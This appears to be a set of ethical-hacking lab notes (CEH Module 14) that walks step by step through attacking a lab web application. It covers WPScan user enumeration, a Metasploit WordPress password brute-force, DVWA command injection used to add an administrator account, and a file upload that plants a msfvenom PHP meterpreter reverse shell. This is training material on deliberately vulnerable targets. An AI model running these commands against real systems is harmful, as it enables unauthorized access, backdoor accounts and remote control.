# Web Application hacking

<details><summary>Hack a Web Application using WPScan and Metasploit</summary>

```console

    [WS22]
    Launch wampserver

	[parrot]
	sudo su
	cd
	wpscan --api-token [API Token] --url http://[WSIP]:8080/CEH --enumerate u
	--enumerate u: specifies the enumeration of usernames.

	Obtained the usernames stored in the database.

    To find user's passwords.

	service postgresql start -> first start the PostgreSQL service.
	msfconsole
	use auxiliary/scanner/http/wordpress_login_enum 
	show options
	set PASS_FILE /home/attacker/Desktop/CEHv12 Module 14 Hacking Web Applications/Wordlist/password.txt 
	set RHOSTS [WIP]
	set RPORT 8080
	set TARGETURI http://[WSIP]:8080/CEH 
	set USERNAME admin -> take any username obtained from above
	run
```
</details>

<details>
<summary>Perform remote os command injection (dvwa web) and get the content from pin file</summary>

```console
    [Win 11]
	http://[WSIP]:8080/dvwa/login.php
	test/abc123
	Command Injection
	
	Ping a device - [W22IP] -> successfully pings the target machine
	Try with ;/&&/&/ 
	| hostname          -> error -> Change security level to low
	| hostname 			-> return machine name, any other details from the system   
	| whoami
	| tasklist 			-> to view the processes running on the machine.
	| Taskkill /3112 /F -> Forcefully terminate the process

	/F- Forecefully terminate
	
	| dir C:\ 			-> files and directories on C:\
	| net user  		-> User account information
	| net user Test /Add ->	Attempt to add a user account remotely.
	| net user 			-> View the new user account
	| net user Test 	-> new account information
	
	Does not have administrative privileges. It has an entry called Local Group Memberships.
	
	| net localgroup Administrators Test/Add  -> To grant administrative privileges
	| net user Test     -> Test is now an administrator account under the Local Group Memberships option.
		
	Check able to connecto to Target machine with new user with RDC
	RDC -> [Target IP]
	Username: Test - connect
```
</details>

<details>
<summary>Perform file upload (dvwa web)</summary>

```console
    
	[linux]
	sudo su
	cd
	msfvenom -p php/meterpreter/reverse_tcp LHOST=[PIP] LPORT=444 -f raw
	Copy payload and paste it into upload.php
		
	Open http://WSIP:8080/dvwa/login.php
	admin/password
	security - low
	File upload - upload the upload.php
	
	[linux]
	sudo su
	cd
	msfconsole
	use exploit/multi/handler
	set payload php/meterpreter/reverse_tcp
	set LHOST [PIP]
	set LPORT 444
	run
	
	Firefox
	Open http://[WSIP]:8080/dvwa/hackable/uploads/upload.php
	
	Terminal - Meterpreter session has successfully been established with the victim system
	sysinfo
	
	----
	if securty set to high
	File upload - upload the high.jpeg
	
	Command Injection
	Ip address: |copy C:\wamp64\www\DVWA\hackable\uploads\high.jpeg C:\wamp64\www\DVWA\hackable\uploads\shell.php + Submit
	
	Terminal
	sudo su
	cd
	msfconsole
	use exploit/multi/handler
	set payload php/meterpreter/reverse_tcp
	set LHOST [PIP]
	set LPORT 2222
	run 
	
	Firefox: http://[WSIP]:8080/dvwa/hackable/uploads/shell.php
	Terminal: Meterpreter session has successfully been established with the victim system.
	sysinfo
```

</details>